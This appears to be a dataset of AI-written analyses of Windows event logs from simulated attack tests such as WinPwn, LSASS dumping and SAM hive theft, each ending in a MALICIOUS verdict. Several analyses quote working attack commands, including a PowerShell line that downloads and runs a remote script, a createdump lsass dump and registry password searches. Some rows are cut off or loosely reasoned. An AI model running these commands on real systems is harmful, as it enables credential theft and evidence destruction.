1. **Usage of `wevtutil.exe`**: The logs show repeated execution of `wevtutil.exe` to clear event logs (`Sysmon`, `Application`, `System`, `Security`). The command-line arguments clearly indicate clearing of logs (e.g., `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, etc.). Clearing event logs is often indicative of malicious activity as it is used to cover tracks after potential unauthorized operations.

2. **High Integrity Level and Admin Context**: The actions are being executed with high integrity levels under the administrative account `SERVER002\admin_test`. This shows that whoever is performing these actions has administrative privileges, which is needed to clear logs.

3. **RPC Ping Executed through PowerShell**: There is an execution of `rpcping` using PowerShell with the following command: `""powershell.exe"" & {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null}`. This could be indicative of malicious activity as `rpcping` can be used for network discovery and testing RPC connections, potentially for lateral movement.

4. **Log Files Cleared**: Security and system event logs show records of event log clearing, explicitly identified by the event ID 1102 for Security logs and ID 104 for System logs. Log clearing is a common step in intrusion activity to remove traces of unauthorized or malicious actions.

### Indications of Malicious Activity:
- The combination of using `wevtutil.exe` to clear logs multiple times with administrative privileges, executing PowerShell scripts to perform network-related actions, and specifically using tools like `rpcping` suggests an attempt to hide malicious activity after performing reconnaissance or network scans potentially.

### Security Log Details:
- The Security log (event ID 1102) confirms that the Security event log was cleared by the `admin_test` account.
- The system log also shows record clearing events by the same user indicating coordinated actions to remove traces across multiple log categories.

### Resolution:
Based on the detailed log analysis, the behavior observed in these logs is consistent with malicious activity for the following reasons:
- Event log clearance indicates attempts to hide or remove traces of activities.
- Usage of potentially risky PowerShell command execution.
- Elevated privileges without an apparent benign operational purpose.
  
### Recommendation:
- **Resolution:** **MALICIOUS**
- Immediate actions should be taken to isolate the affected machine for further forensic analysis.
- Conduct a thorough review of access logs to determine if any unauthorized access occurred.
- Reset passwords and consider revoking administrative privileges for `admin_test` until the incident is resolved.

- **Network Monitoring**: Implement increased monitoring of network traffic for any signs of data being moved to external destinations, particularly those involving PowerShell.
- **Patch and Update**: Ensure all security patches and software updates are applied to mitigate any potential vulnerabilities exploited.

This course of action will aid in further analyzing the situation and minimizing risks associated with these malicious activities."
PowerShell - Prompt User for Password,"Upon reviewing the provided log entries, I have identified several events that could indicate suspicious activity. Below is a detailed analysis:

### Analysis of Suspicious Activities:

1. **Clearing of Event Logs:**
   - System Log Entry 1 (Event ID 104) indicates that the System log was cleared by user `admin_test`.
   - System Log Entry 2 (Event ID 104) indicates that the Windows PowerShell log was cleared by user `admin_test`.
   - Security Log Entry indicates that the Security log was cleared (Event ID 1102) by user `admin_test`.
   - **Suspicion**: Clearing logs can be an indicator of an attempt to cover tracks after performing unauthorized or malicious actions.

2. **Suspicious PowerShell Activity:**
   - Sysmon Log Entry (Event ID 1) shows PowerShell being executed with a script that prompts for credentials (CommandLine: `powershell.exe & {# Creates GUI to prompt for password...`).
   - PowerShell Log Entries indicate usage of PowerShell to execute scripts, including one that seems designed to gather credentials.
   - **Suspicion**: Using PowerShell to prompt for credentials can indicate credential harvesting or spear-phishing activity.

3. **Usage of Privileged Tools:**
   - Sysmon Log Entries show processes like `wevtutil.exe` being used to clear event logs (`CommandLine: ""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`).
   - **Suspicion**: `wevtutil` is often used in post-exploitation phases to remove traces of actions from event logs.

4. **Repeated Creation of Hostname and Whoami Processes:**
   - Frequent invocation of `whoami.exe` and `hostname.exe` could suggest enumeration or reconnaissance activity within the system to gather details about the environment.
   - **Suspicion**: While these commands are used legitimately, frequent execution could indicate reconnaissance activity by an intruder.

5. **Contextual Red Flags:**
   - The involved user `admin_test`, a high-integrity level user, executed commands that typically require administrative privileges, raising concerns about potential misuse of privileged accounts.

### Assessment and Recommendation:

The activities observed in the logs present multiple indicators of potential malicious actions:
- Log file clearing without clear justification is a significant red flag.
- The usage of PowerShell scripts prompting for credentials aligns with tactics used in cyber-attacks aimed at credential theft.
- The chain of command, execution of system tools to clear logs, and potentially recon-related commands denote questionable behavior.

### Resolution:

**MALICIOUS**: The logs indicate activity consistent with malicious behavior. Immediate steps should be taken to:
- Investigate and contain the user account `admin_test`.
- Check for abnormal network activity related to potential data exfiltration.
- Review and possibly implement additional monitoring and security measures to protect sensitive accounts.
- Consider a full incident response operation to verify and remediate any breach.

The analysis highlights the need for prompt investigation and response to address the potential compromise."
List Credential Files via Command Prompt,"Upon detailed analysis of the provided Windows event logs, several indicators suggest potential malicious activity on the host machine, Server002. Here is a breakdown of the suspicious and potentially malicious behavior observed:

1. **Clearing Event Logs:**
   - The Security log (EventID 1102) and System log (EventID 104) entries indicate that the logs were cleared by `admin_test`. This action can be a red flag, as attackers often clear logs to cover their tracks.

2. **Use of `wevtutil.exe`:**
   - The Sysmon events show multiple executions of `wevtutil.exe` with commands to clear logs (e.g., ""cl Security"", ""cl Application"", ""cl System""). Usage of `wevtutil` to clear logs is not normal behavior for an admin and is often associated with malicious attempts to erase evidence of activities.

3. **Suspicious `cmd.exe` Execution:**
   - The entry for `cmd.exe` with the command line arguments to list directories in the user's credentials folder (e.g., `dir /a:h ...\Credentials\`) is concerning. Misuse of the credentials management is a typical behavior during credential theft attempts.

4. **Anomalous `conhost.exe` Instances:**
   - Multiple instances of `conhost.exe` linked to suspicious parent processes (i.e., `wevtutil.exe` and `whoami.exe`) were detected. These could be indicative of process injection or attempts to execute commands stealthily.

5. **`whoami.exe` Usage:**
   - The execution of `whoami.exe` was noted. While this is not inherently malicious, its use in conjunction with other suspicious activities could indicate reconnaissance or gaining privilege information.

6. **Frequent Process Creation and System Events:**
   - A significant amount of process creation events related to `MicrosoftEdgeUpdate.exe` and other Microsoft processes from the Edge update path might suggest system updates, but in the context of other suspicious activities, could be potentially exploited processes.

Given the context and correlation of these suspicious behaviors, it's reasonable to classify this situation as:

**Resolution: MALICIOUS**

### Assessment and Guidance:

- The clearing of event logs combined with the use of `wevtutil.exe` through command line arguments strongly indicates an attempt to cover tracks, typical of malicious activity.
- Given the evidence, immediate actions are recommended to mitigate further risks:

Given the potential severity of the observed behavior, proceed with the assumption of a breach and respond accordingly to secure your network infrastructure."
dump volume shadow copy hives with System.IO.File,"Upon examining the provided Windows Event Logs, particularly focusing on PowerShell, System, Security, and Sysmon events, several indicators of potentially malicious activities have been identified:

### Detailed Analysis:

1. **PowerShell Logs:**
   - **Command Execution:** The PowerShell logs indicate execution of commands that attempt to copy the Security Account Manager (SAM) database files from volume shadow copies (`HarddiskVolumeShadowCopy`) to a temporary directory (`$env:TEMP`). This activity is strongly indicative of an attempt to extract password hashes from the SAM database, which is a classic tactic used in credential theft operations. The PowerShell command attempts this action multiple times (from `1..10`), which suggests persistence in trying to access the shadow copies.

2. **System Logs:**
   - **Log File Clearing:** There are events indicating that an account `admin_test` cleared logs across several channels (System, Windows PowerShell). Such activity is notably suspicious because it is often employed by attackers to cover their tracks after executing malicious activities.

3. **Security Logs:**
   - **Privilege Escalation:** A user `admin_test` is logged with multiple high-privilege user rights on the system (`SeSecurityPrivilege, SeBackupPrivilege` among others), which indicates that this account has administrative privileges and could be used to perform widespread system actions or maintain persistence. There are events illustrating that this user logged on, invoked with multiple privileges.
   - **Time Change Events:** There are instances of time change events through `svchost.exe`, which could indicate attempts to evade time-based detection or logging mechanisms.

4. **Sysmon Logs:**
   - **Wevtutil Executions:** There are multiple executions of the `wevtutil.exe` command-line tool for clearing event logs. The pattern suggests attempts to obfuscate activities by removing or clearing logs. The `C:\\Windows\\system32\\wevtutil.exe cl` command line specifically targets multiple channels including the Security, System, and Application logs.
   - **Suspicious Program Executions:** Multiple instances of tools used for edge update processes and Windows Defender signature updates are seen, which can be benign but also could be leveraged by an attacker under the guise of legitimate updates.

### Assessment:

- **Indicators of Compromise:** 
  - The SAM database access attempt, combined with subsequent log file clearing and privilege escalation events, strongly indicates malicious intent. These activities demonstrate typical tactics in post-exploitation phases of an attack, particularly in credential dumping and log cleanup.

### Resolution:

**MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent further credential theft or lateral movement.
   - Collect memory and disk images from the suspect system for further forensic analysis.
   - Change all administrative passwords that could have been accessible from this machine.

2. **Further Investigation:**
   - Conduct a thorough investigation of logins and access from the `admin_test` account to identify potential unauthorized access or credential misuse.
   - Review historical logs, if recoverable, to track any unnoticed lateral movement or data exfiltration events.

3. **Preventive Measures:**
   - Implement tighter access controls and monitoring for privileges associated with administrative accounts.
   - Enhance logging retention policies and implement centralized logging and monitoring solutions to detect and analyze suspicious activities in real-time.

Given the activity observed, it is critical to act swiftly to contain and investigate this potential security breach further."

Enumeration for Credentials in Registry,"**Detailed Analysis of the Logs:**

1. **Log Cleared Events:**
   - The Sysmon and Security logs show that the ""admin_test"" user cleared the logs on Server002. This activity is captured by Event IDs `1102` in the Security log and `104` in the System log. The clearing of logs is often an indicator of malicious activity, as an attacker might want to hide their tracks.

2. **Suspicious Command Execution:**
   - The Sysmon logs show multiple executions of `wevtutil.exe` with the `cl` (clear) command, targeting the Application, System, and Security logs. This corroborates the log clearing events seen in the Security and System logs.
   - Additionally, the command-line execution of `cmd.exe` to query registry keys related to passwords is particularly concerning (`cmd.exe /c reg query HKLM /f password /t REG_SZ /s & reg query HKCU /f password /t REG_SZ /s`). This conduct aligns with attempts to gather sensitive information and is a common tactic used for reconnaissance or privilege escalation.

3. **Use of System Programs:**
   - The execution of `whoami.exe` to verify user information and `conhost.exe` appearances are typical and expected in many scenarios, but in this context, they serve as supporting evidence of manual investigation by a malicious actor.
   - `wevtutil.exe` instances appear again, but their initial clearing of logs is significant.

4. **Privileges and User Accounts:**
   - Events indicate the use of elevated privileges, such as the Event ID `4672` which logs special privileges being assigned to the SYSTEM account (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). While the SYSTEM user is often used for executing OS-level tasks, it's contextually significant when combined with log clearing.

**Assessment of the Situation:**
The logs present a series of beaconing activities consistent with an intruder attempting to cover their actions. The use of `wevtutil.exe` to clear event logs and queries using `cmd.exe` for passwords are highly indicative of malicious behavior.

**Identified Threats and Risks:**
- An actor with administrative controls conducted log clearing post activity, which is suggestive of unauthorized access and malicious intent.
- Potential compromise of sensitive information given registry searches for passwords.
- Possible lateral movement or privilege escalation given the SYSTEM account activity and log clearing actions.

**Guidance on How to Proceed:**

Dump LSASS with createdump.exe from .Net v5,"**Analysis:**

Upon reviewing the Windows event logs, several indicators point towards potentially malicious activity on the system, specifically on Server002 under the user ""admin_test"". Key observations include:

1. **Execution of High-risk PowerShell Commands:**
   - A PowerShell command was executed to resolve a path and use `createdump.exe` to generate a dump of the `lsass` process. This can be particularly concerning as `lsass` (Local Security Authority Subsystem Service) contains sensitive authentication data. Tools like `createdump.exe`, typically a part of the .NET Core SDK, are not standard for such operations, indicating potential credential theft activity.
   - Evidence: `powershell.exe & {$exePath = resolve-path \""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"" & \""$exePath\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}`

2. **Clearing of Event Logs:**
   - There are multiple entries in the Security and System logs indicating that logs have been cleared shortly after the suspicious PowerShell command execution. This behavior is often associated with efforts to cover tracks after unauthorized or malicious activity.
   - Evidence: Events logged under EventID 104 for System and EventID 1102 for Security, specifically mentioning logs are cleared by ""admin_test"".

3. **Unusual Use of Windows System Utilities:**
   - There are instances of `wevtutil.exe` being executed to clear logs for various event channels, including the Security and Sysmon channels. The frequent execution of `wevtutil.exe` with `cl` (clear log) arguments is a red flag.
   - Evidence: Multiple entries in the Sysmon logs showing processes where `wevtutil.exe` was invoked to clear logs.

4. **Series of Host Enumeration Commands:**
   - The execution of commands like `whoami.exe` and `hostname.exe` are documented. While these can be legitimate, their timing, alongside other suspicious activities, suggests possible reconnaissance steps in a cyber-attack scenario.
   - Evidence: Sysmon logs documenting the execution of these utilities under user ""admin_test"".

**Assessment:**

These logs indicate serious red flags synonymous with malicious activity, such as potential credentials dumping through PowerShell, followed by attempts to erase evidence via log-clearing activities. These actions are often indicative of post-compromise behavior aiming at lateral movement or privilege escalation within the network.

**Guidance:**

- Immediate containment of the affected machine (Server002) is warranted to prevent further compromise. 
- Conduct a thorough forensic investigation to determine the full scope of access and any data exfiltration activities.
- Review and enhance endpoint detection and monitoring policies to identify suspicious use of PowerShell and Windows utilities.
- Reset passwords for accounts that may have had their credentials exposed or tampered with.
- Educate users on the risks of unauthorized script execution and the importance of vigilance in system monitoring.

**Resolution**: **MALICIOUS** - The logs contain definitive signs of malicious activity."
PetitPotam,"Upon reviewing the provided event logs, the following observations were made:

1. **Sysmon and PowerShell Logs**: 
   - There are several process creation events involving PowerShell executing commands that appear to be using an external payload, specifically `PetitPotam.exe`. This is indicative of a potentially malicious activity, as PetitPotam is known as a tool for NTLM relay attacks, which could be part of a lateral movement attempt within a network.
   - The PowerShell command line execution shows a specific execution path tied to the Atomic Red Team framework, often used for simulation of real-world attacks for testing security monitoring capabilities.

2. **Event Log Clearing**:
   - Multiple log clearing events have been observed (`EventID 1102` in Security and `EventID 104` in System logs). The clearing of logs is generally indicative of an attempt to cover tracks, which is a clear sign of potentially malicious activity.

3. **Privilege Usage**:
   - Processes such as `wevtutil.exe` (event viewer utility) are used with high integrity levels, suggesting an elevated privilege context was involved. This utility is often leveraged to clear Windows Event Logs, as observed in the logs, further suggesting potential malicious behavior.

4. **User Context**:
   - Most of the suspicious activities are executed under the user `admin_test`, who has administrative privileges. The consistency of events such as executing system commands and power shell scripts, coupled with the clearing of logs, strengthens the notion of suspicious activity conducted with administrative access.

5. **Other Events**:
   - The logs related to Microsoft Edge Update appear normal and reflect routine operations related to updating the browser. These are identified through processes under `NT AUTHORITY\SYSTEM` context without any notable irregularities.

**Assessment**:
- **MALICIOUS**: The behaviors observed, including the use of known attack simulations and log clearance activities, are aligned with techniques used in active cyber intrusions. The specific operations, coupled with the apparent effort to erase forensic traces, solidify the assessment of potentially malicious actions carried out on the system.

"Registry dump of SAM, creds, and secrets","Based on a detailed analysis of the provided logs, several indicators suggest suspicious to potentially malicious activity:

1. **Privilege Escalation and Event Log Clearing**:
   - Security Event ID 4672 indicates that the local ""admin_test"" account was granted several powerful privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege) often associated with administrative tasks. This is common for a SYSTEM logon, but when correlated with subsequent activity, it raises concerns.
   - Security Event ID 1102 indicates the security event log was cleared by ""admin_test"". Clearing event logs is a common tactic used by attackers to cover their tracks after unauthorized activity.

2. **Suspicious Command Execution**:
   - Sysmon logs show execution of wevtutil.exe to clear various Windows logs (Security, Application, System, Windows PowerShell) by ""admin_test"". This activity appears coordinated and suggests an attempt to remove traces of malicious actions.
   - The command line ""cmd.exe"" executed by ""admin_test"" with the command to save registry hives (HKLM\\sam, HKLM\\system, HKLM\\security) is particularly concerning, as these hives contain sensitive system and credential information possibly for offline password cracking or other unauthorized access.

3. **Security Risk of Account Compromise**:
   - Commands like ""whoami"" and ""hostname"" are typically harmless but, in this context, they seem to form part of enumeration typically carried out during initial stages of an intrusion.
   - With processes like wsmprovhost.exe involved, it may indicate remote management tools were used, possibly abused, in administrative contexts.

4. **Comprehensive Timeline and Context**:
   - The rapid series of events and the nature of the commands align with actions typically observed during a penetration test or malicious activity.
   - The privileges, event clearing, and specific commands executed do not match typical administrative activities, especially on a high-profile machine like the CEO's.

**Assessment and Guidance**:
The observed sequence of events exhibits clear patterns of malicious activities. The combination of unauthorized log clearing, privilege use, and sensitive system command execution suggests a probable compromise intended to gather sensitive information and cover attack traces.

**Resolution**: MALICIOUS

**Recommended Actions**:
- Immediately isolate the affected system to prevent further unauthorized access or data exfiltration.
- Conduct a comprehensive forensic investigation to determine the extent of the compromise.
- Reset all admin credentials and ensure that privileged accounts have been set up properly with strong monitoring.

GPP Passwords (findstr),"Upon reviewing the provided logs, several anomalous activities stand out which may indicate malicious activity. Here's the detailed analysis:

### Security Log Analysis:
1. **Log Clearing Event (Event ID 1102):**
   - The security log shows an event log clearance, which is often a red flag indicating potential malicious intent to cover tracks. It was performed by an account with the username ""admin_test"". Log clearing activities need immediate scrutiny as they can indicate post-incident cleanup by an unauthorized user.

### Sysmon Log Analysis:
1. **Execution of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` are executed in quick succession, clearing logs for System, Application, Security, and ""Windows PowerShell"". This is not typical behavior for a legitimate user and further indicates an attempt to hide activities by deleting the logs.
   
2. **Execution Context:**
   - The `wevtutil.exe` commands were executed under the user ""SERVER002\\admin_test"" with a high integrity level, indicating administrative privileges, which are necessary for such operations.

3. **Unusual Command-Line Activity:**
   - The use of `cmd.exe` to search for sensitive terms such as ""cpassword"" across the network's sysvol share can be indicative of attempts to gather credentials or configuration information from Group Policy Preferences files, which have been known to store passwords insecurely in past configurations.

### System Log Analysis:
1. **Time Change Events:**
   - Time change events are recorded but appear to correlate with the ntp synchronization, which can be benign if properly configured. However, in conjunction with the log clear events and process executions analyzed, they signify a suspicious activity pattern.
   
2. **Repeated Log Clearing:**
   - Similar to the security log, the system log records the clearing of logs for several critical channels, suggesting an effort to eliminate evidence.

### Application Log and Windows PowerShell Log Analysis:
- The collected logs do not show significant anomalies or additional information suggesting non-standard applications or scripts executed at the time of interest.

### Assessment:
The activities observed, particularly the clearing of event logs immediately after a series of command-line executions targeting sensitive information, points to deliberate actions taken by an unauthorized entity or a user behaving maliciously. This pattern of using administrative tools to clean logs is consistent with common post-exploitation techniques employed to maintain stealth during and following malicious operations.

### Conclusion: MALICIOUS
Based on the systematic clearing of logs using administrative commands and searches for sensitive information such as passwords, the summarized findings confidently point toward malicious activity on the investigated host.

### Guidance on How to Proceed:
1. **Immediate Isolation:**
   - The involved system (`Server002`) should be isolated from the network to prevent further unauthorized access or data exfiltration.

2. **Credential Review:**
   - Begin a review and potential reset of credentials, particularly for the impacted account (""admin_test"") and any accounts that may have been compromised through credential scraping.

3. **Further Forensic Investigation:**
   - Conduct a complete forensic investigation to understand the full scope of the breach, including identifying lateral movement or additional compromised systems.

4. **Log Review and Process Execution:**
   - Enhance logging and monitoring capabilities to detect any further unauthorized activities, ensuring that future log clearing activities are identified in real-time.

5. **Review and Harden Policies:**
   - Evaluate and strengthen policies around administrative privileges and logging, including exploring tools for immutable audit log capture.

This summary and the actions listed are essential to contain the threat and prevent any similar potential incidents."
WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"Based on the provided Windows event logs, here's a detailed analysis of the activities and a determination of the nature of the events:

### Suspicious Activity:

1. **PowerShell Command Execution**:
   - Multiple PowerShell logs indicate the execution of a script facilitated by `iex` (Invoke-Expression) downloading and running a script from a web resource on GitHub associated with the ""PowerSharpPack"" repository. The script being invoked is `Invoke-Sharpweb.ps1`. This method is a classic technique used for downloading and executing potentially malicious scripts.

2. **Event Log Clearing**:
   - The System, Security, and Windows PowerShell event logs were cleared by a user named `admin_test`. This behavior is particularly concerning as it is a common technique for attackers to cover their tracks and remove evidence of malicious activity.

3. **Wevtutil.exe Use**:
   - The use of `wevtutil.exe` was observed in multiple occasions to clear event logs (`cl` flag), as shown in Sysmon logs. While it might be natural in some administrative contexts, given the timing in relation to other suspicious activities, this adds to the suspicious narrative.

4. **Unusual Network Connection**:
   - The Time Service log entry with a specific NTP connection isn't inherently suspicious but doesn't add significant weight to the analysis in the context of remote command execution.

### Indicators of Compromise:

- **PowerShell Download and Execution**: The usage of `Invoke-Expression` to execute a remotely downloaded script from an external URL without prior verification often indicates an attempt at malicious activity.
- **Log Cleaning**: The explicit clearing of log files (event IDs 104 and 1102) suggests attempts to hide tracks, which is linked to malicious actions.

### Assessment:

Based on the provided log entries, we are seeing clear instances of suspicious techniques that align with common malicious behaviors (e.g., script execution from the internet, log tampering). The activity appears to match steps in typical attack chains, particularly those involved in post-compromise actions such as credential dumping and hiding traces.

### Conclusion:

**Resolution: MALICIOUS**

This assessment is based on the execution of potentially harmful scripts obtained from external sources without verification, combined with attempts to cover tracks by event log clearing. These actions strongly suggest malicious intent.

### Guidance:

1. **Immediate Action**: 
   - Isolate the machine from the network to prevent further potential lateral movement or exfiltration.
  
2. **Forensic Investigation**:
   - Capture and preserve memory and disk images for detailed forensic analysis.
   - Analyze network traffic for any indications of data exfiltration or command and control communication.

3. **Remediation**:
   - Change credentials that might have been accessed or used in the logs immediately.
   - Review and harden PowerShell execution policies and monitor for similar activities.

4. **Monitoring and Alerts Setup**:
   - Enhance logging and monitoring to catch similar activities in real-time.
   - Set up alerts for potential indicators, such as the use of `iex` with external URLs in PowerShell or log clearing operations.

These steps should help mitigate and contain any adverse impact of the activities observed in the logs."
WinPwn - passhunt,"After a comprehensive review of the provided logs, the investigation reveals several indicators of potential malicious activity. The following points highlight the suspicious behavior identified:

1. **Event Log Clearing**: Multiple event log clearing activities were observed:
   - System logs, Windows PowerShell logs, and Security logs were cleared by the user `admin_test`.
   - Such actions are often taken by attackers attempting to cover their tracks after executing malicious activities on a host.

2. **Wevtutil Usage**: The `wevtutil.exe` command-line tool was used multiple times to clear logs, as seen in Sysmon event IDs 1 and 5, with command lines such as `wevtutil cl System`, `wevtutil cl Security`, and `wevtutil cl ""Windows PowerShell""`. This behavior is highly indicative of malicious intent to wipe forensic evidence.

3. **Unusual PowerShell Execution**:
   - A PowerShell script was executed with a suspicious command-line pattern: 
      ```
      powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', 
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), passhunt -local $true -noninteractive}
      ```
   - This command indicates the script was downloaded from the internet and executed, possibly for malicious purposes (e.g., downloading and executing a remote PowerShell script from GitHub).

4. **Logged Privileges**:
   - The user `admin_test` was granted extensive privileges, including `SeDebugPrivilege`, `SeSecurityPrivilege`, and others typically needed for advanced system operations or exploitation activities.

5. **Command Activity**:
   - Processes such as `whoami.exe` and `hostname.exe` were executed, which are often used by attackers to gather information about the compromised machine and logged on users.
   
6. **Logon Activities**:
   - NTLM authentication was used for logons, which is less secure and may be indicative of lateral movement attempts or unauthorized access.

### Assessment:
Based on these indicators:
- **Log Clearing** is an attempt to hide malicious actions.

Azure - Dump All Azure Key Vaults with Microburst,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behaviors:

1. **Event Log Clearing**:
   - Several instances of event log clearing are observed:
     - **Security Log:** EventID 1102 indicates the security log was cleared by `admin_test` (User SID: S-1-5-21-3962163828-2803415714-1403596700-1006). 
     - **Sysmon Operational Log:** Multiple entries indicate `wevtutil.exe` was used to clear logs in a short period, for several event logs, namely Security, Application, System, and Windows PowerShell.

2. **Privilege Escalation and High Integrity Processes**:
   - EventID 4672 indicates special privileges were assigned to `admin_test`, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are typically not needed for regular operations and suggest potential for misuse.
   - Processes are running at a High Integrity Level, including questionable ones like `wevtutil.exe`.

3. **Unusual PowerShell Activity**:
   - PowerShell was used with a script located in: `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\Get-AzurePasswords.ps1`.
   - The command executed attempts to import a module, connect to Azure, retrieve passwords, and writes output to a file. This is highly suspicious and suggests possible credential harvesting or unauthorized access attempts to Azure resources.

4. **Process Execution**:
   - A series of processes related to .NET executions, such as `csc.exe` and `cvtres.exe`, were triggered from PowerShell, indicating potential scripting activities which could be used to compile and execute malicious code.

#### Indicators of Potential Malicious Activity or Compromise:

- **Log Clearing**: The use of `wevtutil.exe` to clear logs is a strong indication of malicious activity as it aims to hide traces.
- **PowerShell Script Execution**: The observed PowerShell activities are typical tactics used in penetration testing or cyber-attacks, especially the attempt to access Azure passwords.

Simulating access to Windows Firefox Login Data,"Upon analyzing the provided Windows event logs, several indicators of potential malicious activity stand out:

1. **PowerShell Activity:**
   - The PowerShell logs indicate an execution of a command to copy Mozilla Firefox profiles to a suspicious directory path: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads`. This action is highly suspicious as copying web browser profiles can be an indicator of data exfiltration intentions, especially when followed by a path that suggests payload handling (`ExternalPayloads`). Additionally, the usage of `$env:APPDATA` to determine the path dynamically suggests an intention to obfuscate the true action being performed.

2. **System Log Events:**
   - The system logs show event ID 104, which indicates that the event logs for both the System and Windows PowerShell channels were cleared shortly before the suspected PowerShell command execution. The clearing of critical logs, especially by a user named `admin_test`, could be indicative of attempts to cover tracks after malicious actions.

3. **Security Log Activity:**
   - Security log event ID 1102 confirms the clearing of security logs by the same user, `admin_test`. Log clearing is a common tactic used by attackers to remove evidence of unauthorized activity.

4. **Process Execution with Sysmon:**
   - The Sysmon logs indicate several executions of the `wevtutil.exe` utility, which is used to clear event logs. These executions happened right before the logs were cleared in the System and Windows PowerShell channels. The `PROCESS_NAME` is consistent with log clearing and highly suspicious.
   - Several other benign processes such as `whoami.exe` and `hostname.exe` were executed, which are commonly used for gathering information about the operating environment, a potential action of a malicious actor performing reconnaissance.

5. **Suspicious Logon Activity:**
   - There is evidence of elevated token usage (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which suggests that privileged operations were performed despite the suspicious nature of other activities observed.

### Assessment:
By synthesizing all logs:
- The PowerShell command activities and the clearing of logs indicate suspicious and malicious activity with attempts to potentially steal sensitive data (Firefox profiles) or prepare the system for further compromise.
- The user `admin_test`, the timing of event log clearing, and the processes executed during this period all point to deliberate actions probably meant to hide traces of activity on the system.

### Resolution:
**MALICIOUS** - The log entries contain clear indicators of a security breach considering the unauthorized data copying attempt, systematic logs clearing, and the usage of high privilege operations.

### Guidance:
- **Immediate Steps:**
  - Isolate Server002 from the network to prevent further data exfiltration or loss.
  - Conduct a thorough forensic investigation on Server002 for any other potentially compromised files or malware.

Azure - Dump Azure Instance Metadata from Virtual Machines,"Upon reviewing the provided logs, several indicators of potentially malicious activity have been identified:

1. **Event Log Clearing**: The logs show multiple instances of log clearing using the `wevtutil` command. This process was executed under the ""admin_test"" user and was directed to multiple channels, including System, Security, and PowerShell logs. Cleared logs, especially from security channels, are a strong indicator of a possible attempt to hide malicious activities. 

2. **Suspicious PowerShell Activity**: There are PowerShell logs indicating that the script `powershell.exe & {Invoke-RestMethod -Headers @{\""Metadata\""=\""true\""} -Method GET -Uri \""http://169.254.169.254/metadata/instance?api-version=2021-02-01\"" | ConvertTo-Json -Depth 64 > $env:temp\\T1552.005Test2.txt}` was executed. The use of such a command suggests an attempt to access metadata services typically used in cloud environments, possibly to gather instance information. This could be indicative of reconnaissance activities.

3. **Log File Clearing**: Event 1102 in the Security log indicates that the security logs were cleared, an action that is abnormal under regular circumstances and often associated with attempts to cover tracks.

4. **Repeated Use of `whoami` and `hostname`**: Frequent checks of current user and hostname using `whoami.exe` and `hostname.exe` could indicate an attacker verifying their environment post-compromise.

Given these findings, there is substantial evidence suggesting an attempt to obscure logs and potentially gather sensitive information using PowerShell scripts. The log clearing behavior is particularly concerning, as it directly attempts to hide actions that could otherwise be monitored.

### Resolution: MALICIOUS

The logs contain clear indicators of malicious activity:
- Systematic clearing of logs across several channels.
- Execution of a PowerShell script accessing metadata that could be used for reconnaissance.
- Usage of `wevtutil` to clear logs, which is often used maliciously.

Access unattend.xml,"### Detailed Analysis:

The log entries provided cover a brief span of time and several notable events indicating potentially suspicious behavior. Here's the breakdown of findings based on different logs:

#### **Sysmon Log Analysis:**

1. **Process Creation (EventID 1) involving `wevtutil.exe`:**
   - The `wevtutil.exe` command-line utility is used to clear event logs across various channels, which is uncommon in routine activity unless performed by IT administrators for maintenance. However, its use within a short time frame multiple times (clearing operational, security, and system logs), especially on the CEO's machine, can indicate an attempt to cover tracks or hide activity.
   
2. **Clearing of Windows Logs (EventID 5) Records:**
   - Multiple instances of log records associated with `wevtutil.exe` and `conhost.exe` indicate log manipulation. The specific CommandLine entries like `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl Security` suggest logs were cleared from important streams, which is a suspicious activity typically associated with concealment in a security incident.
   
3. **Presence of CMD and Script Execution:**
   - The execution of `cmd.exe` with the `/c type` on unattended files `unattend.xml` located typically for system deployment settings (`Windows\\Panther\\`) suggests a potential reconnaissance action to extract sensitive settings or configurations.

4. **User Information Gathering via `whoami.exe`:**
   - The execution of `whoami.exe` followed closely indicates possible account enumeration.

5. **Execution of standard Windows processes (`conhost.exe`, `sppsvc.exe`, `svchost.exe`) appears routine;** however, it is the correlation with activities such as log clearing and unusual `cmd.exe` usage that invokes context for suspicion.

6. **Highly Privileged Execution:**
   - Many of the processes are executed with `NT AUTHORITY\SYSTEM`, indicating a very high privilege level, which is necessary for impactful malicious actions.

#### **System Log Analysis:**

1. **Event Log Clearing (EventID 104):**
   - The `admin_test` user cleared the event logs for System and Windows PowerShell channels, confirmed by entries indicating logs were cleared without a backup path. Repeated clearing across essential logs, presumably without scheduled maintenance, reinforces potential malicious intent.

2. **Time Synchronization Events:**
   - The synchronization entries from `svchost.exe` are routine but combined with the other log-clearing events might represent synchronized activities aimed at time-based actions.

#### **Security Log Analysis:**

1. **Event Log Clearing (EventID 1102):**
   - The clearing of Security logs by `admin_test` without a backup indicates deliberate log tampering, critical in malicious attacks aimed at obscuring their trace.

### **Assessment:**

- **Suspicious Behaviors:**
  - Repeated usage of `wevtutil.exe` for clearing critical log channels systematically within seconds.
  - Execution of commands that may involve reconnaissance (e.g., accessing `unattend.xml` and checking user context with `whoami.exe`).

- **Indicators of Potential Malicious Activity:**
  - Routine administrative tools (`wevtutil.exe`, `cmd.exe`) being used in a pattern consistent with log tampering and potential data discovery suggests possible compromise.
